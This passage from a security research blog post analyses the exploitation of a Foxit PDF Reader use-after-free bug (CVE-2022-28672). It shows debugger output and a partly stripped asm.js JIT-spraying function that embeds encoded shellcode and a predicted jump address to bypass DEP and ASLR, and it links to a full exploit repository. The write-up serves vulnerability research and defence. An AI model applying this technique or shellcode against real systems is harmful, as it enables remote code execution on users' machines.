18cd0000 18cd5000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
    ...
3fec0000 3fec5000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
3ff00000 3ff05000     5000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [..G...VG........]
```

We can confirm the shellcode spraying by looking at the base of any allocation above it.

```
0:000> u 18ca0000
18ca0000 e97b470000      jmp     18ca4780
18ca0005 e956470000      jmp     18ca4760
18ca000a cc              int     3
18ca000b cc              int     3
18ca000c cc              int     3
```

The first jump is to the generated code at `18ca4780`, which in our case contains our encoded shellcode.

```
18ca4780 55           push    ebp
18ca4781 89e5         mov     ebp, esp
18ca4783 6a0a         push    0Ah
18ca4785 56           push    esi
18ca4786 8b7e17       mov     edi, dword ptr [esi+17h]
18ca4789 3927         cmp     dword ptr [edi], esp
18ca478b 0f83e5010000 jae     18ca4976
18ca4791 8b7e1b       mov     edi, dword ptr [esi+1Bh]
18ca4794 8b7f07       mov     edi, dword ptr [edi+7]
18ca4797 8b461f       mov     eax, dword ptr [esi+1Fh]
18ca479a 8b00         mov     eax, dword ptr [eax]
18ca479c 68a247b419   push    19B447A2h
18ca47a1 68909090a8   push    0A8909090h
18ca47a6 6831c990a8   push    0A890C931h
18ca47ab 686a3058a8   push    0A858306Ah
18ca47b0 68648b00a8   push    0A8008B64h
18ca47b5 688b400ca8   push    0A80C408Bh
18ca47ba 688b7014a8   push    0A814708Bh
```

The **JIT spraying** script has been **stripped for readability**. The full source can be found in the exploit on GitHub.

```js
// spray calc.exe WinExec + ExitProcess shellcode
// VirtualAlloc of size 0x5000
function sprayJITShellcode(asmJsModuleName, payloadFuncName, ffiFuncName)
{
    var script = `
        function ${asmJsModuleName} (stdlib, ffi, heap){
            'use asm';
            var ffi_func = ffi.func;

            function ${payloadFuncName} () {
                var val = 0;
                val = ffi_func(
                    0xa8909090|0,
                    0xa8909090|0,
                    0xa8909090|0,
                    0xa890d6ff|0,
                    0xa890006a|0,
                    0xa890d7ff|0,
                    0xa851056a|0,
                    0xa890e189|0,
                    //...
                    0xa83c538b|0,
                    0xa810588b|0,
                    0xa8ad96ad|0,
                    0xa814708b|0,
                    0xa80c408b|0,
                    0xa8008b64|0,
                    0xa858306a|0,
                    0xa890c931|0,
                    0xa8909090|0,
                    0x19b447a2|0,   //using predicated 19b40000 base
                )|0;
                return val|0;
            }
            return ${payloadFuncName};
        }

        function ${ffiFuncName} () {
            var x = 0;
            return x|0;
        }
        for (var f=0; f<0x10; f++) {
            asmJsModulesArr.push(${asmJsModuleName}(this, { func: ${ffiFuncName} }, 0));
        };
    `;
    eval(script)
    // required to generate jit code
    asmJsModulesArr[asmJsModulesArr.length-1]();
}

// spray jit shellcode allocation
// 00005dbc: index to shellcode from the base of the VirtualAlloc
for (var jitcount=0; jitcount<3000; jitcount++) {
    sprayJITShellcode("foo"+jitcount, "payload"+jitcount, "ffi_func"+jitcount);
}
```

In this case, we are using the best-educated guess of `0x19b40000` for the shellcode execution, where one of our **JIT** sprays is located.

```
0:025> u 19b40000
19b40000 e97b470000      jmp     19b44780
19b40005 e956470000      jmp     19b44760
19b4000a cc              int     3
19b4000b cc              int     3
19b4000c cc              int     3
```

In the **JIT spray** script, a hardcoded address derived from the assumed base address of `0x19b447a2|0,   // using predicated 19b40000 base` is used as the starting point for the **shellcode**. This address is referenced by a `call` instruction, as can be verified using a debugger. This allows us to execute the shellcode at a known location in memory, bypassing **DEP** and **ASLR** protections.

```
0:025> ? 19b44729+74
Evaluate expression: 431245213 = 19b4479d

0:025> dd 19b4479d
19b4479d  19b447a2 90909068 c93168a8 6a68a890
19b447ad  68a85830 a8008b64 0c408b68 708b68a8
19b447bd  ad68a814 68a8ad96 a810588b 3c538b68
```

The execution of the shellcode must start from `19b447a2`. This can be verified in the debugger.

```x86asm
19b447a2 90         nop
19b447a3 90         nop
19b447a4 90         nop
19b447a5 a868       test    al, 68h
19b447a7 31c9       xor     ecx, ecx
19b447a9 90         nop
19b447aa a868       test    al, 68h
19b447ac 6a30       push    30h
19b447ae 58         pop     eax
19b447af a868       test    al, 68h
19b447b1 648b00     mov     eax, dword ptr fs:[eax]
19b447b4 a868       test    al, 68h
19b447b6 8b400c     mov     eax, dword ptr [eax+0Ch]
19b447b9 a868       test    al, 68h
...
```

By analyzing the decoded shellcode, it is possible to see that it contains a series of valid instructions that carry out the desired actions. This indicates that the **JIT spraying** technique was **successful** in allowing us to execute our shellcode in the context of the **Foxit** process.

## Conclusion

In conclusion, this research shows that if **Foxit Reader** had been compiled with **Control Flow Guard (CFG)** support, the discovered bug would have been more difficult to exploit. However, the lack of **CFG** support allowed the attacker to use **JIT spraying** to bypass existing mitigations such as **ASLR** and **DEP**. This highlights the importance of using multiple layers of defense to protect against attacks.

## Exploit Repository

<https://github.com/hacksysteam/CVE-2022-28672>

## Demo Video

<https://www.youtube.com/embed/5K44TxWPKCQ>
b:[["$","div",null,{"className":"-mt-6","children":["$","$L18",null,{"className":"mb-8","children":["$","h1",null,{"className":"text-3xl md:text-4xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent","children":"Foxit PDF Reader - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2022-28672"}]}]}],["$","$L19",null,{"slug":"foxit-reader-uaf-rce-jit-spraying-cve-2022-28672","frontmatter":{"title":"Foxit PDF Reader - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2022-28672","date":"December 16, 2022","authors":["Ashfaq Ansari","Krishnakant Patil"],"excerpt":"The article presents an insightful analysis of a use-after-free vulnerability in Foxit Reader that can lead to remote code execution. The exploration further dives into JIT spraying techniques, showcasing how they can be employed to exploit this vulnerability. (CVE-2022-28672)","tags":["Foxit Reader","Remote Code Execution","JIT Spraying","cve-2022-28672","dep","aslr","use-after-free","uaf","foxit","rce","jit","spraying","exploit"]},"content":"$1a","tocItems":[{"id":"overview","text":"Overview","depth":2},{"id":"advisory","text":"Advisory","depth":2},{"id":"testbed","text":"Testbed","depth":2},{"id":"crash-state","text":"Crash State","depth":2},{"id":"proof-of-concept","text":"Proof of Concept","depth":2},{"id":"static-pdf-fields","text":"Static PDF fields","depth":3},{"id":"faulting-javascript","text":"Faulting Javascript","depth":3},{"id":"root-cause-analysis","text":"Root Cause Analysis","depth":2},{"id":"exploitation","text":"Exploitation","depth":2},{"id":"bypassing-mitigations","text":"Bypassing Mitigations","depth":2},{"id":"data-execution-prevention-dep","text":"Data Execution Prevention (DEP)","depth":3},{"id":"control-flow-guard-cfg","text":"Control Flow Guard (CFG)","depth":3},{"id":"address-space-layout-randomization-aslr","text":"Address Space Layout Randomization (ASLR)","depth":3},{"id":"jit-spraying-to-rescue-bypassing-dep-aslr-at-once","text":"JIT Spraying to rescue! Bypassing DEP, ASLR at once","depth":2},{"id":"conclusion","text":"Conclusion","depth":2},{"id":"exploit-repository","text":"Exploit Repository","depth":2},{"id":"demo-video","text":"Demo Video","depth":2}]}]]
10:null
14:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
f:null
17:{"metadata":[["$","title","0",{"children":"Foxit PDF Reader - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2022-28672 | HackSys Inc Blog"}],["$","meta","1",{"name":"description","content":"The article presents an insightful analysis of a use-after-free vulnerability in Foxit Reader that can lead to remote code execution. The exploration further dives into JIT spraying techniques, showcasing how they can be employed to exploit this vulnerability. (CVE-2022-28672)"}],["$","link","2",{"rel":"manifest","href":"/manifest.webmanifest","crossOrigin":"$undefined"}],["$","meta","3",{"name":"keywords","content":"Foxit Reader, Remote Code Execution, JIT Spraying, cve-2022-28672, dep, aslr, use-after-free, uaf, foxit, rce, jit, spraying, exploit"}],["$","meta","4",{"name":"script:ld+json","content":"{\"@context\":\"https://schema.org\",\"@type\":\"Article\",\"headline\":\"Foxit PDF Reader - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2022-28672\",\"datePublished\":\"2022-12-16T00:00:00.000Z\",\"author\":{\"@type\":\"Person\",\"name\":\"Ashfaq Ansari\"},\"description\":\"The article presents an insightful analysis of a use-after-free vulnerability in Foxit Reader that can lead to remote code execution. The exploration further dives into JIT spraying techniques, showcasing how they can be employed to exploit this vulnerability. (CVE-2022-28672)\",\"publisher\":{\"@type\":\"Organization\",\"name\":\"HackSys Inc\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"https://hacksys.io/logo.svg\"}},\"url\":\"https://hacksys.io/blogs/foxit-reader-uaf-rce-jit-spraying-cve-2022-28672\",\"mainEntityOfPage\":{\"@type\":\"WebPage\",\"@id\":\"https://hacksys.io/blogs/foxit-reader-uaf-rce-jit-spraying-cve-2022-28672\"}}"}],["$","link","5",{"rel":"canonical","href":"https://hacksys.io/blogs/foxit-reader-uaf-rce-jit-spraying-cve-2022-28672"}],["$","meta","6",{"property":"og:title","content":"Foxit PDF Reader - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2022-28672"}],["$","meta","7",{"property":"og:description","content":"The article presents an insightful analysis of a use-after-free vulnerability in Foxit Reader that can lead to remote code execution. The exploration further dives into JIT spraying techniques, showcasing how they can be employed to exploit this vulnerability. (CVE-2022-28672)"}],["$","meta","8",{"property":"og:url","content":"https://hacksys.io/blogs/foxit-reader-uaf-rce-jit-spraying-cve-2022-28672"}],["$","meta","9",{"property":"og:type","content":"article"}],["$","meta","10",{"property":"article:published_time","content":"2022-12-16T00:00:00.000Z"}],["$","meta","11",{"property":"article:author","content":"Ashfaq Ansari"}],["$","meta","12",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","13",{"name":"twitter:title","content":"Foxit PDF Reader - Use after Free - Remote Code Execution (RCE) Exploit - CVE-2022-28672"}],["$","meta","14",{"name":"twitter:description","content":"The article presents an insightful analysis of a use-after-free vulnerability in Foxit Reader that can lead to remote code execution. The exploration further dives into JIT spraying techniques, showcasing how they can be employed to exploit this vulnerability. (CVE-2022-28672)"}]],"error":null,"digest":"$undefined"}
12:{"metadata":"$17:metadata","error":null,"digest":"$undefined"}
